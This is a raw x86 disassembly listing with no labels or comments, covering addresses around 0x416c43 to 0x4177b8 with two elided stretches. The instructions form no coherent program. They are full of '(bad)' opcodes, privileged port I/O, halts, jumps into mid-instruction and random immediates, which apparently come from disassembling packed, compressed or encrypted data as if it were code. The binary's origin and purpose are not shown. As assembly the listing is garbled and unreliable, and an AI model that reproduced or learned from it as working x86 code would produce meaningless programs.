  416c43:	arpl   WORD PTR [ebx],dx
  416c45:	xor    al,0x52
  416c47:	loope  0x416cb4
  416c49:	inc    ecx
  416c4a:	ret    
  416c4b:	mov    dh,0xaf
  416c4d:	ror    DWORD PTR [esi+0x631ac135],0xa
  416c54:	push   ss
  416c55:	dec    edi
  416c56:	dec    esp
  416c57:	inc    ebp
  416c58:	pop    esi
  416c59:	repnz mov edi,0x76e45f26
  416c5f:	and    ah,bh
  416c61:	shl    BYTE PTR [ebp+0x59],1
  416c64:	pop    esp
  416c65:	out    0x52,eax
  416c67:	cdq    
  416c68:	test   al,0x90
  416c6a:	inc    esp
  416c6b:	in     al,dx
  416c6c:	test   BYTE PTR [edi+esi*8-0x363a87ff],bh
  416c73:	repz xchg esp,eax
  416c75:	mov    ds:0xa7d1758a,al
  416c7a:	add    BYTE PTR [edi],ch
  416c7c:	cmp    BYTE PTR [eax-0x9378b13],bh
	...
  416e56:	mov    ?,WORD PTR [ebp-0x1b]
  416e59:	in     al,dx
  416e5a:	idiv   esp
  416e5c:	(bad)  
  416e5d:	jg     0x416ed1
  416e5f:	and    eax,0x77fe1474
  416e64:	cmp    eax,0x1c5c16e
  416e69:	add    BYTE PTR [edx],ah
  416e6b:	pop    es
  416e6c:	add    BYTE PTR [eax],al
  416e6e:	adc    BYTE PTR [esi],bl
  416e70:	mov    dl,BYTE PTR [eax+0x2a]
  416e73:	lahf   
  416e74:	xor    al,0xec
  416e76:	jmp    0x416ede
  416e78:	cmp    ch,BYTE PTR [edi-0x31e1a49e]
  416e7e:	mov    bl,0x38
  416e80:	popa   
  416e81:	xor    al,0x15
  416e83:	mov    ebp,0xfdbe0bf2
  416e88:	mov    dh,BYTE PTR [edi-0xfc65356]
  416e8e:	mov    esp,DWORD PTR [edi-0x59]
  416e91:	fisttp WORD PTR [ebx-0x500bbb0]
  416e97:	xor    DWORD PTR ds:0xff6c8f5c,ebx
  416e9d:	mov    eax,ds:0xcde9cebe
  416ea2:	rcl    BYTE PTR [edi],cl
  416ea4:	ret    
  416ea5:	add    BYTE PTR [eax+0x20],dl
  416ea8:	jo     0x416e3b
  416eaa:	les    edi,FWORD PTR [edi+0x16]
  416ead:	ror    ebp,cl
  416eaf:	cs cwde 
  416eb1:	inc    esp
  416eb2:	jge    0x416eb8
  416eb4:	jb     0x416f01
  416eb6:	sub    ecx,DWORD PTR [eax]
  416eb8:	icebp  
  416eb9:	push   esi
  416eba:	stos   DWORD PTR es:[edi],eax
  416ebb:	imul   esi,DWORD PTR [esi+0x31d912d3],0xa99ddcd4
  416ec5:	push   ecx
  416ec6:	dec    ecx
  416ec7:	stc    
  416ec8:	mov    edx,ebp
  416eca:	inc    ebx
  416ecb:	jno    0x416e50
  416ecd:	inc    edi
  416ece:	aaa    
  416ecf:	and    eax,0xbdab1cbb
  416ed4:	xchg   edx,eax
  416ed5:	sbb    esi,edi
  416ed7:	cli    
  416ed8:	mov    WORD PTR [eax+ebx*4-0x28],fs
  416edc:	sub    BYTE PTR [esi-0x683e77b4],al
  416ee2:	jb     0x416f42
  416ee4:	hlt    
  416ee5:	popf   
  416ee6:	sahf   
  416ee7:	in     eax,0x26
  416ee9:	rcl    DWORD PTR [ebx],0xd
  416eec:	jmp    0x416ee9
  416eee:	stos   DWORD PTR es:[edi],eax
  416eef:	imul   ecx,DWORD PTR [esi],0x652f2c64
  416ef5:	sub    ah,bl
  416ef7:	mov    ebp,0xa742be16
  416efc:	ins    BYTE PTR es:[edi],dx
  416efd:	test   eax,0xe5afa60a
  416f02:	xchg   ebp,eax
  416f03:	inc    ecx
  416f04:	add    BYTE PTR [ecx+0x13],dh
  416f07:	cs mov esi,0x139c0cae
  416f0d:	dec    ecx
  416f0e:	or     BYTE PTR [edi-0xd],dl
  416f11:	mov    esi,0x832279dc
  416f16:	inc    ebp
  416f17:	mov    ch,BYTE PTR [esi-0x2f8af05f]
  416f1d:	ds retf 
  416f1f:	dec    eax
  416f20:	xlat   BYTE PTR ds:[ebx]
  416f21:	xor    eax,0x1b77c95d
  416f26:	addr16 dec edi
  416f28:	sub    BYTE PTR [esi+esi*8-0x42],cl
  416f2c:	mov    al,0xcc
  416f2e:	ret    
  416f2f:	mov    esp,DWORD PTR [ebx+0x41094857]
  416f35:	push   0x6a682607
  416f3a:	xchg   edi,eax
  416f3b:	out    dx,eax
  416f3c:	sub    al,0x6b
  416f3e:	data16 mov ds:0xff1a5153,al
  416f44:	adc    eax,DWORD PTR [edi-0x7057d3bb]
  416f4a:	outs   dx,BYTE PTR ds:[esi]
  416f4b:	push   esi
  416f4c:	int    0xe6
  416f4e:	dec    edx
  416f4f:	in     al,dx
  416f50:	outs   dx,BYTE PTR ds:[esi]
  416f51:	out    0xb6,al
  416f53:	mov    eax,ds:0xe3d2f5e3
  416f58:	aaa    
  416f59:	loope  0x416faf
  416f5b:	rcr    eax,0x1a
  416f5e:	add    al,0x75
  416f60:	pop    esi
  416f61:	call   0xb55e:0x892013f4
  416f68:	jecxz  0x416f48
  416f6a:	jbe    0x416f38
  416f6c:	mov    ecx,0x52b18f8d
  416f71:	inc    ecx
  416f72:	mov    eax,0xab04495
  416f77:	lds    ecx,FWORD PTR [ebx]
  416f79:	push   cs
  416f7a:	mov    bh,0xbb
  416f7c:	fsubr  QWORD PTR [ebx-0x7e7d76d6]
  416f82:	pop    ecx
  416f83:	and    dh,BYTE PTR [ebx-0x7e3f40b6]
  416f89:	add    bl,al
  416f8b:	daa    
  416f8c:	cmp    eax,0x1e9a6f64
  416f91:	js     0x416f99
  416f93:	push   0x41
  416f95:	test   eax,0xeb3984d
  416f9a:	ret    
  416f9b:	outs   dx,DWORD PTR ds:[esi]
  416f9c:	add    ebx,DWORD PTR [ebp-0x1588d7a3]
  416fa2:	fwait
  416fa3:	mov    cl,0x75
  416fa5:	dec    esp
  416fa6:	xchg   edi,eax
  416fa7:	add    DWORD PTR [edi-0x16],eax
  416faa:	xchg   esp,eax
  416fab:	stos   DWORD PTR es:[edi],eax
  416fac:	jecxz  0x417021
  416fae:	dec    ecx
  416faf:	inc    eax
  416fb0:	dec    esi
  416fb1:	int    0x9f
  416fb3:	fiadd  DWORD PTR [esi-0x24]
  416fb6:	loopne 0x416fd4
  416fb8:	mov    cl,0x81
  416fba:	lahf   
  416fbb:	jl     0x416f5b
  416fbd:	sbb    al,0x4
  416fbf:	and    dl,bl
  416fc1:	test   DWORD PTR [ebp+0x1cf67e65],ebx
  416fc7:	xchg   ecx,eax
  416fc8:	out    dx,eax
  416fc9:	ficom  WORD PTR [esi]
  416fcb:	repz stc 
  416fcd:	push   cs
  416fce:	out    0x6e,eax
  416fd0:	mov    ds:0x341ce20a,al
  416fd5:	cs cld 
  416fd7:	repz aas 
  416fd9:	iret   
  416fda:	jnp    0x416fd5
  416fdc:	jo     0x416fac
  416fde:	dec    ebp
  416fdf:	outs   dx,BYTE PTR ds:[esi]
  416fe0:	hlt    
  416fe1:	cdq    
  416fe2:	dec    ecx
  416fe3:	daa    
  416fe4:	ret    
  416fe5:	push   ecx
  416fe6:	inc    ebp
  416fe7:	mov    ds:0xca0893ab,al
  416fec:	out    0x83,eax
  416fee:	push   ds
  416fef:	outs   dx,DWORD PTR ds:[esi]
  416ff0:	inc    esi
  416ff1:	push   ds
  416ff2:	lea    ebx,[edx-0x42]
  416ff5:	adc    BYTE PTR [ebx],dh
  416ff7:	sbb    eax,0xecc29479
  416ffc:	pop    es
  416ffd:	rol    BYTE PTR [edi+esi*2+0x63ef4e55],cl
  417004:	push   ebx
  417005:	fdiv   DWORD PTR [edi+0x135b45d]
  41700b:	xor    ah,cl
  41700d:	pop    edx
  41700e:	mov    eax,ds:0xf66ae240
  417013:	je     0x416ffa
  417015:	fdivr  st(2),st
  417017:	xchg   esp,eax
  417018:	inc    eax
  417019:	cld    
  41701a:	xchg   esi,eax
  41701b:	cli    
  41701c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41701d:	sbb    eax,0xa1ea3a96
  417022:	adc    BYTE PTR [edx+ebx*1],dh
  417025:	inc    ecx
  417026:	jle    0x416fed
  417028:	mov    ebx,edx
  41702a:	fisubr DWORD PTR [edx-0x5d4e26ff]
  417030:	mov    bl,0x29
  417032:	popa   
  417033:	inc    edi
  417034:	clc    
  417035:	adc    ebx,DWORD PTR [esi+eiz*2+0x34]
  417039:	not    DWORD PTR ds:0xf8f17ba
  41703f:	stos   DWORD PTR es:[edi],eax
  417040:	(bad)  
  417042:	cmp    edx,esp
  417044:	iret   
  417045:	add    esi,0xcc187fef
  41704b:	lahf   
  41704c:	mov    cl,0x41
  41704e:	sbb    al,al
  417050:	adc    ebp,DWORD PTR ds:0x9eac8f5b
  417056:	mov    ebx,0xc95997da
  41705b:	adc    ebx,0xfffffff4
  41705e:	pop    edi
  41705f:	mov    ebx,0x1c5a662
  417064:	mov    ebp,0x17ebc0cd
  417069:	push   0x4f50a415
  41706e:	loop   0x417070
  417070:	adc    BYTE PTR [esi+0x41d3442d],dh
  417076:	xlat   BYTE PTR ds:[ebx]
  417077:	adc    DWORD PTR [ecx-0x37],edi
  41707a:	mov    DWORD PTR [eax-0x5a503290],esi
  417080:	mov    ch,0x92
  417082:	xor    DWORD PTR [esi+esi*1+0x2068ce7a],ebx
  417089:	arpl   WORD PTR [ebx-0x1c],di
  41708c:	jno    0x417101
  41708e:	mov    esp,0x9ef992ba
  417093:	inc    eax
  417094:	jne    0x417091
  417096:	inc    ebx
  417097:	fwait
  417098:	sti    
  417099:	pusha  
  41709a:	aaa    
  41709b:	push   ebp
  41709c:	mov    esp,0x921d5ec4
  4170a1:	pop    esp
  4170a2:	rcl    DWORD PTR [esi-0x8a3f97d],0xc6
  4170a9:	sub    eax,0xa1df09a8
  4170ae:	test   eax,0x66a3b931
  4170b3:	cmp    DWORD PTR ss:[ebp+0x75],edi
  4170b7:	xor    BYTE PTR [edi+ebx*4+0x49cbf101],dh
  4170be:	in     eax,0xf9
  4170c0:	adc    DWORD PTR [ebx+0x487c50f4],esp
  4170c6:	lds    ebp,FWORD PTR [edx-0x79]
  4170c9:	addr16 pop edx
  4170cb:	aaa    
  4170cc:	push   0x55933e59
  4170d1:	(bad)  
  4170d3:	dec    ebx
  4170d4:	jge    0x41711a
  4170d6:	imul   eax,DWORD PTR [edx-0x20],0x928b4eb5
  4170dd:	push   esi
  4170de:	inc    ebx
  4170df:	jb     0x41707e
  4170e1:	sub    ch,ch
  4170e3:	aam    0x15
  4170e5:	pop    ds
  4170e6:	int    0x5c
  4170e8:	and    DWORD PTR [edx+0x20bf61e0],esi
  4170ee:	pop    es
  4170ef:	scas   eax,DWORD PTR es:[edi]
  4170f0:	add    esi,DWORD PTR [ebx-0x50]
  4170f3:	pop    esi
  4170f4:	push   edx
  4170f5:	lods   eax,DWORD PTR ds:[esi]
  4170f6:	call   0x4ee991b1
  4170fb:	cdq    
  4170fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170fd:	jnp    0x4170ca
  4170ff:	mov    dl,al
  417101:	mov    ah,0xaf
  417103:	into   
  417104:	xor    BYTE PTR [eax-0x31],bl
  417107:	inc    edi
  417108:	not    ebx
  41710a:	sti    
  41710b:	xor    BYTE PTR [ebx],ch
  41710d:	arpl   si,di
  41710f:	or     BYTE PTR [esi+0x29],ah
  417112:	xor    WORD PTR [ebx-0x101e89c8],sp
  417119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711a:	ds mov esp,0x2e7a5730
  417120:	int    0x9c
  417122:	push   ebp
  417123:	aad    0xce
  417125:	ja     0x41710f
  417127:	xor    DWORD PTR [edi+ebp*2+0x6],eax
  41712b:	jo     0x4170c2
  41712d:	push   ebp
  41712e:	lea    eax,[esp+edx*2-0x5]
  417132:	and    eax,0x2eee8863
  417137:	xchg   edx,eax
  417138:	dec    esp
  417139:	test   eax,0x5bfd81ca
  41713e:	loop   0x417166
  417140:	adc    bl,bl
  417142:	xor    al,0xc2
  417144:	outs   dx,BYTE PTR ds:[esi]
  417145:	repnz outs dx,BYTE PTR ds:[esi]
  417147:	adc    al,0xb7
  417149:	int    0xb4
  41714b:	iret   
  41714c:	pop    es
  41714d:	out    dx,eax
  41714e:	add    DWORD PTR [edx+0x7e7100f8],eax
  417154:	retf   0x28e5
  417157:	jno    0x4170ff
  417159:	adc    eax,0xda9ef6e0
  41715e:	or     DWORD PTR [edi+0x61],0xb2bd21f5
  417165:	push   ecx
  417166:	mov    al,ds:0x560cf92a
  41716b:	add    dh,0x16
  41716e:	ror    DWORD PTR [edx+eiz*4-0x3d2d108f],cl
  417175:	xchg   esp,eax
  417176:	int    0xab
  417178:	dec    esi
  417179:	rcl    edx,cl
  41717b:	lods   eax,DWORD PTR ds:[esi]
  41717c:	stos   DWORD PTR es:[edi],eax
  41717d:	(bad)  
  41717e:	jb     0x417125
  417180:	or     BYTE PTR [edx],0x17
  417183:	and    bh,BYTE PTR [ecx-0x33288299]
  417189:	pop    edi
  41718a:	adc    al,BYTE PTR [edx+0x14]
  41718d:	lods   al,BYTE PTR ds:[esi]
  41718e:	int    0x7
  417190:	fiadd  DWORD PTR [edx+0x7c]
  417193:	mov    cl,0xb8
  417195:	outs   dx,DWORD PTR ds:[esi]
  417196:	cld    
  417197:	or     eax,0x1e1fbdd2
  41719c:	and    eax,0x56916463
  4171a1:	arpl   WORD PTR [esi],ax
  4171a3:	adc    bl,BYTE PTR [ecx]
  4171a5:	mov    edi,DWORD PTR [ebx]
  4171a7:	mov    dl,0xb1
  4171a9:	test   al,0x26
  4171ab:	scas   al,BYTE PTR es:[edi]
  4171ac:	inc    eax
  4171ad:	cli    
  4171ae:	add    eax,0x1e200131
  4171b3:	stc    
  4171b4:	xchg   edi,eax
  4171b5:	mov    cs,ebp
  4171b7:	inc    esi
  4171b8:	scas   al,BYTE PTR es:[edi]
  4171b9:	retf   
  4171ba:	xor    al,0xc2
  4171bc:	mov    DWORD PTR [ecx],ebx
  4171be:	mov    ecx,0x5c599fcc
  4171c3:	fdivr  st(2),st
  4171c5:	repnz add BYTE PTR [esi+eiz*8],al
  4171c9:	pop    ecx
  4171ca:	int3   
  4171cb:	xor    bl,BYTE PTR ds:0xee8e43ad
  4171d1:	lods   eax,DWORD PTR ds:[esi]
  4171d2:	in     al,dx
  4171d3:	aas    
  4171d4:	jns    0x4171fd
  4171d6:	ss int 0x64
  4171d9:	push   0xffffffda
  4171db:	fnstsw ax
  4171dd:	jg     0x417240
  4171df:	cmp    BYTE PTR [edi-0x3a],0xd
  4171e3:	fsub   DWORD PTR [eax+0x19]
  4171e6:	pop    ss
  4171e7:	dec    ecx
  4171e8:	jae    0x417232
  4171ea:	dec    ecx
  4171eb:	(bad)  
  4171ec:	cmp    al,0x7e
  4171ee:	(bad)  
  4171ef:	xchg   ebp,eax
  4171f0:	fwait
  4171f1:	and    al,0x4e
  4171f3:	retf   0x926
  4171f6:	dec    esp
  4171f7:	pusha  
  4171f8:	adc    dh,BYTE PTR [eax]
  4171fa:	push   0x32
  4171fc:	mov    DWORD PTR [ecx-0x5d],0x946b1c7e
  417203:	jnp    0x41724f
  417205:	mov    edi,0x85ab70e1
  41720a:	jp     0x41724a
  41720c:	jnp    0x41720a
  41720e:	jo     0x417209
  417210:	rol    dl,1
  417212:	fist   WORD PTR ds:0x4b85b7b4
  417218:	mov    ah,0x3a
  41721a:	xor    DWORD PTR [edx],ebp
  41721c:	leave  
  41721d:	sbb    DWORD PTR [esi-0x42fe7a76],ebx
  417223:	push   0x77fb5f1c
  417228:	fwait
  417229:	mov    bh,0x20
  41722b:	and    al,0x9e
  41722d:	dec    ebp
  41722e:	jbe    0x417217
  417230:	test   DWORD PTR [edx+edx*4+0x522a2793],esp
  417237:	mov    dl,0xe6
  417239:	(bad)  
  41723b:	imul   edx,DWORD PTR [edi],0xffffffc6
  41723e:	sbb    eax,eax
  417240:	(bad)  
  417241:	jnp    0x417277
  417243:	shr    al,cl
  417245:	(bad)  
  417246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417247:	sbb    esp,DWORD PTR [ecx-0x52163ab6]
  41724d:	fld    DWORD PTR [esi-0x2]
  417250:	push   ss
  417251:	push   edi
  417252:	mov    eax,gs
  417254:	(bad)  
  417255:	add    esi,ebx
  417257:	pop    DWORD PTR [edx-0x24cbf10c]
  41725d:	shl    BYTE PTR [esi+edx*8],0x13
  417261:	cmp    DWORD PTR [esi],0xffffffed
  417264:	xor    DWORD PTR ds:0xdcb831c9,ebp
  41726a:	push   ebx
  41726b:	lahf   
  41726c:	retf   0x5037
  41726f:	jne    0x4172ad
  417271:	mov    bl,0x19
  417273:	jp     0x41721e
  417275:	adc    DWORD PTR [ecx-0x5ddea6e5],0x79d1805a
  41727f:	pop    ebp
  417280:	mov    ds:0x883aaa51,al
  417285:	lahf   
  417286:	(bad)  
  417287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417288:	repnz or esi,DWORD PTR [esp+eax*8-0x73c0da2a]
  417290:	clc    
  417291:	xchg   edi,eax
  417292:	and    DWORD PTR [esi],edi
  417294:	icebp  
  417295:	and    bh,ah
  417297:	les    edi,FWORD PTR [ecx+0xf]
  41729a:	or     ebp,ebp
  41729c:	and    bl,bh
  41729e:	std    
  41729f:	loope  0x417292
  4172a1:	push   0x208a138a
  4172a6:	xchg   ebp,eax
  4172a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172a8:	push   ebx
  4172a9:	sub    eax,0xd93fc583
  4172ae:	sub    eax,edx
  4172b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172b1:	push   ecx
  4172b2:	pop    edi
  4172b3:	aam    0xb8
  4172b5:	daa    
  4172b6:	outs   dx,DWORD PTR ds:[esi]
  4172b7:	or     BYTE PTR [edi+0x3818612f],bh
  4172bd:	adc    eax,0xa53d4a85
  4172c2:	ret    0x6a6e
  4172c5:	test   BYTE PTR ds:0xe1df4511,cl
  4172cb:	xor    bh,BYTE PTR [eax-0x41]
  4172ce:	and    BYTE PTR [esi],cl
  4172d0:	data16 repz repnz cli 
  4172d4:	mov    ah,0x47
  4172d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d7:	inc    edx
  4172d8:	xor    al,0xd0
  4172da:	popf   
  4172db:	lahf   
  4172dc:	aaa    
  4172dd:	dec    ebx
  4172de:	inc    ecx
  4172df:	ins    BYTE PTR es:[edi],dx
  4172e0:	push   ecx
  4172e1:	std    
  4172e2:	dec    ecx
  4172e3:	test   DWORD PTR ds:0xc4169d2,edx
  4172e9:	rcr    DWORD PTR [esi+0x78d78202],0xc7
  4172f0:	mov    dl,BYTE PTR [edx+0x6c]
  4172f3:	popf   
  4172f4:	cmp    BYTE PTR [esi-0x48d96beb],0x28
  4172fb:	(bad)  [ecx-0x9]
  4172fe:	in     al,0x77
  417300:	in     al,0xbf
  417302:	sub    DWORD PTR [eax+0x15f533a0],edx
  417308:	mov    WORD PTR [ebx+ebx*8],?
  41730b:	lods   al,BYTE PTR ds:[esi]
  41730c:	lock ret 
  41730e:	jae    0x4172f3
  417310:	cmp    dl,BYTE PTR [ebx+ebx*2]
  417313:	(bad)  
  417314:	iret   
  417315:	sub    DWORD PTR [ebp+0x3814c295],edx
  41731b:	ret    
  41731c:	test   DWORD PTR [edi],edx
  41731e:	lea    ebp,[ecx+eax*8-0x23f28402]
  417325:	mov    dh,0xc9
  417327:	cmp    esp,ecx
  417329:	retf   
  41732a:	ret    
  41732b:	cmp    dh,bl
  41732d:	xchg   esi,eax
  41732e:	push   0xf4e32a6f
  417333:	cli    
  417334:	dec    eax
  417335:	xchg   ebx,eax
  417336:	xor    ch,BYTE PTR [ecx-0x64]
  417339:	sub    al,0xb5
  41733b:	xor    eax,0x483ffafc
  417340:	imul   esp,DWORD PTR [ebx+edx*4],0xe6add55b
  417347:	lds    eax,FWORD PTR [edi+0x96836ae]
  41734d:	jl     0x4172fc
  41734f:	add    al,0x86
  417351:	mov    ebp,0xfd224638
  417356:	or     edi,DWORD PTR [ebp-0x3e]
  417359:	mov    eax,ds:0x1ca0b09d
  41735e:	scas   eax,DWORD PTR es:[edi]
  41735f:	sahf   
  417360:	icebp  
  417361:	(bad)  
  417363:	xchg   DWORD PTR [eax],ebp
  417365:	push   ss
  417366:	sbb    edi,DWORD PTR [esi]
  417368:	xadd   BYTE PTR [esi],cl
  41736b:	pop    ss
  41736c:	push   edx
  41736d:	pop    edi
  41736e:	inc    edx
  41736f:	mov    ds:0x61732eaa,al
  417374:	inc    eax
  417375:	sub    edi,DWORD PTR [esi-0x834bb45]
  41737b:	mov    eax,0xa1557ecb
  417380:	xor    BYTE PTR [eax+0x23],cl
  417383:	mul    esi
  417385:	arpl   WORD PTR [esi-0x33],bx
  417388:	and    ebx,DWORD PTR [ebx]
  41738a:	pop    eax
  41738b:	or     edx,esi
  41738d:	pop    ebx
  41738e:	jp     0x41732e
  417390:	ret    0xed37
  417393:	out    dx,al
  417394:	icebp  
  417395:	jb     0x417317
  417397:	jns    0x417394
  417399:	sbb    esi,DWORD PTR [eiz*2+0x2b34b5e]
  4173a0:	add    dl,BYTE PTR [edi+ebx*4+0x6977702e]
  4173a7:	inc    ecx
  4173a8:	loope  0x41737f
  4173aa:	mov    ax,ds:0x72118ff4
  4173b0:	jnp    0x41740a
  4173b2:	in     al,dx
  4173b3:	out    dx,al
  4173b4:	(bad)  
  4173b5:	clc    
  4173b6:	jmp    0x417414
  4173b8:	pop    esp
  4173b9:	popa   
  4173ba:	ror    DWORD PTR [ebx],0x12
  4173bd:	(bad)  
  4173be:	xchg   esi,eax
  4173bf:	dec    esp
  4173c0:	cdq    
  4173c1:	jl     0x41740d
  4173c3:	push   ds
  4173c4:	test   eax,0x26bc8324
  4173c9:	or     edx,ebx
  4173cb:	mov    esp,0x2f3ba7af
  4173d0:	or     edx,ecx
  4173d2:	shr    DWORD PTR [edi-0x289d1291],cl
  4173d8:	sti    
  4173d9:	shl    DWORD PTR [ecx],1
  4173db:	mov    ah,0x5c
  4173dd:	inc    ebx
  4173de:	jg     0x417391
  4173e0:	gs pop edx
  4173e2:	mov    eax,ds:0x583d3616
  4173e7:	loopne 0x417386
  4173e9:	jbe    0x4173b4
  4173eb:	mov    bh,0xd3
  4173ed:	loop   0x417445
  4173ef:	mov    al,cl
  4173f1:	ins    BYTE PTR es:[edi],dx
  4173f2:	jge    0x4173a7
  4173f4:	out    dx,al
  4173f5:	sub    bh,0x2e
  4173f8:	pushf  
  4173f9:	popf   
  4173fa:	push   es
  4173fb:	xor    al,0x17
  4173fd:	hlt    
  4173fe:	xor    bl,BYTE PTR [ebx-0x12]
  417401:	cwde   
  417402:	inc    ebp
  417403:	outs   dx,BYTE PTR ds:[esi]
  417404:	les    eax,FWORD PTR [eax-0x5947941c]
  41740a:	fisub  DWORD PTR [ecx+0x6b55229]
  417410:	cs dec edi
  417412:	enter  0xd927,0x73
  417416:	inc    edx
  417417:	dec    edx
  417418:	add    DWORD PTR [edx+eax*2-0x34],ecx
  41741c:	push   esi
  41741d:	push   esp
  41741e:	ins    DWORD PTR es:[edi],dx
  41741f:	loop   0x4173cc
  417421:	pop    edx
  417422:	in     al,0xda
  417424:	neg    BYTE PTR [edx*4-0x5b97f514]
  41742b:	jmp    0x417487
  41742d:	setns  bl
  417430:	out    0xa2,eax
  417432:	sti    
  417433:	and    DWORD PTR [eax],edi
  417435:	test   eax,0x9bebb77a
  41743a:	shl    BYTE PTR [edi-0x95e5b5],cl
  417440:	lods   al,BYTE PTR ds:[esi]
  417441:	pop    ecx
  417442:	mov    cl,0x16
  417444:	jno    0x417484
  417446:	mov    esp,0x5344ef56
  41744b:	(bad)  
  41744c:	mov    ebx,DWORD PTR [esi]
  41744e:	xlat   BYTE PTR ds:[ebx]
  41744f:	aaa    
  417450:	sbb    DWORD PTR [ebx-0x31],esp
  417453:	jbe    0x417403
  417455:	inc    ecx
  417456:	lds    eax,FWORD PTR [ebp-0x46]
  417459:	sbb    eax,0x717ab1dd
  41745e:	dec    edx
  41745f:	in     al,dx
  417460:	mov    al,ds:0xb6b87bf1
  417465:	sub    eax,0xcd431ba1
  41746a:	sahf   
  41746b:	add    al,0xde
  41746d:	(bad)  
  41746f:	ja     0x41747c
  417471:	and    dl,dl
  417473:	jnp    0x4174cf
  417475:	aas    
  417476:	or     BYTE PTR [ebx-0x60],cl
  417479:	out    0x2a,eax
  41747b:	mov    esp,0x8e5b06ea
  417480:	inc    ebx
  417481:	inc    esi
  417482:	ds pop es
  417484:	ret    0x9175
  417487:	cmp    eax,DWORD PTR ds:0xba519bd0
  41748d:	push   esi
  41748e:	dec    edi
  41748f:	ds adc ecx,ebp
  417492:	pop    ebx
  417493:	xchg   ebp,eax
  417494:	ins    DWORD PTR es:[edi],dx
  417495:	sub    al,0x3
  417497:	sub    ebx,DWORD PTR [ecx+0x31]
  41749a:	sub    eax,0xbcbfaae0
  41749f:	adc    edi,DWORD PTR [edi]
  4174a1:	mov    dh,0x83
  4174a3:	neg    DWORD PTR [ebx+0x6dfa3a43]
  4174a9:	outs   dx,DWORD PTR ds:[esi]
  4174aa:	pop    eax
  4174ab:	std    
  4174ac:	or     dh,BYTE PTR [eax-0x366d3907]
  4174b2:	xor    al,0x53
  4174b4:	ja     0x417439
  4174b6:	rcr    BYTE PTR [esi+eax*2+0x441197c9],0x1c
  4174be:	es icebp 
  4174c0:	out    dx,eax
  4174c1:	ins    BYTE PTR es:[edi],dx
  4174c2:	adc    eax,0xd4b27dcf
  4174c7:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174c9:	ror    BYTE PTR [ebp+0x3d],1
  4174cc:	ror    al,0xc
  4174cf:	mov    ds:0x4ff93b18,al
  4174d4:	repz iret 
  4174d6:	sub    DWORD PTR [eax-0x2ef53763],esi
  4174dc:	cmp    eax,0x462064dd
  4174e1:	pop    ss
  4174e2:	xchg   edx,eax
  4174e3:	shr    DWORD PTR [eax],cl
  4174e5:	push   ebx
  4174e6:	leave  
  4174e7:	pusha  
  4174e8:	daa    
  4174e9:	bnd jmp 0x4174e9
  4174ec:	pop    esi
  4174ed:	loope  0x41752f
  4174ef:	xor    DWORD PTR [edx],0x75
  4174f2:	jecxz  0x4174c3
  4174f4:	and    al,ch
  4174f6:	push   esp
  4174f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f8:	fmul   DWORD PTR [edx+ebp*8+0x4a]
  4174fc:	jg     0x4174ae
  4174fe:	out    dx,eax
  4174ff:	push   ebp
  417500:	push   ss
  417501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417502:	xchg   ebp,eax
  417503:	es and ebp,DWORD PTR es:[esi-0x5]
  417508:	push   edx
  417509:	push   ebp
  41750a:	call   0xa5b4:0x1c4ba446
  417511:	cdq    
  417512:	mov    al,ds:0x8a99c5b8
  417517:	or     DWORD PTR [ebp-0xe165ec8],esp
  41751d:	add    DWORD PTR [ebx],0xb848a308
  417523:	mov    al,0x93
  417525:	pop    ebx
  417526:	mov    cl,0xdf
  417528:	leave  
  417529:	iret   
  41752a:	mov    edi,0xc3dec184
  41752f:	sbb    DWORD PTR [eax+0x5216b211],ebp
  417535:	out    0x36,al
  417537:	dec    eax
  417538:	stos   DWORD PTR es:[edi],eax
  417539:	add    eax,DWORD PTR [esi]
  41753b:	retf   0xbd9
  41753e:	lds    ecx,FWORD PTR [eax+0xa]
  417541:	pushf  
  417542:	xchg   edx,eax
  417543:	call   0x418c5b94
  417548:	(bad)  
  417549:	xchg   esp,eax
  41754a:	mov    al,ds:0x4d93ad72
  41754f:	jbe    0x4175b1
  417551:	dec    ebx
  417552:	sbb    al,0x8c
  417554:	cli    
  417555:	adc    DWORD PTR [edx+0x53f6f14a],ecx
  41755b:	rol    DWORD PTR [ebx+0x127756ad],0xb5
  417562:	outs   dx,DWORD PTR ds:[esi]
  417563:	adc    al,cl
  417565:	loopne 0x4175e2
  417567:	sbb    cl,BYTE PTR [eax]
  417569:	adc    bh,BYTE PTR [ecx]
  41756b:	out    dx,al
  41756c:	cmp    eax,0xae69e19c
  417571:	in     eax,dx
  417572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417573:	pop    es
  417574:	dec    ebp
  417575:	inc    BYTE PTR [ecx+0xfc8348e]
  41757b:	mov    al,ds:0x30f0154a
  417580:	or     dl,ah
  417582:	xchg   DWORD PTR [ecx],esi
  417584:	out    0xf2,al
  417586:	mov    ebp,0xb668383
  41758b:	and    eax,0x384ad276
	...
  417768:	arpl   WORD PTR [esi+0x63ff63be],bx
  41776e:	call   FWORD PTR [esi-0x676d79db]
  417774:	inc    esp
  417775:	ss pop ecx
  417777:	mov    ebp,0x1b77d
  41777c:	and    al,BYTE PTR [edi]
  41777e:	add    BYTE PTR [eax],al
  417780:	pusha  
  417781:	pop    ss
  417782:	imul   edi,DWORD PTR [ebx-0x16e0f1ce],0x81b0c5c3
  41778c:	pushf  
  41778d:	adc    al,BYTE PTR [ebx]
  41778f:	shl    BYTE PTR [ebx],0xd8
  417792:	into   
  417793:	(bad)  
  417794:	dec    ecx
  417795:	imul   edx,DWORD PTR [ecx-0xdae1742],0xffffff98
  41779c:	pop    esp
  41779d:	inc    esp
  41779e:	aas    
  41779f:	ins    BYTE PTR es:[edi],dx
  4177a0:	imul   ebp,DWORD PTR [edx],0xffffff9c
  4177a3:	fwait
  4177a4:	cmp    edx,DWORD PTR [edx+0x30af2a76]
  4177aa:	in     al,dx
  4177ab:	mov    edx,0xfa875c98
  4177b0:	pop    ecx
  4177b1:	push   esp
  4177b2:	add    DWORD PTR [ebp-0x6814fa61],ecx
  4177b8:	inc    ebp
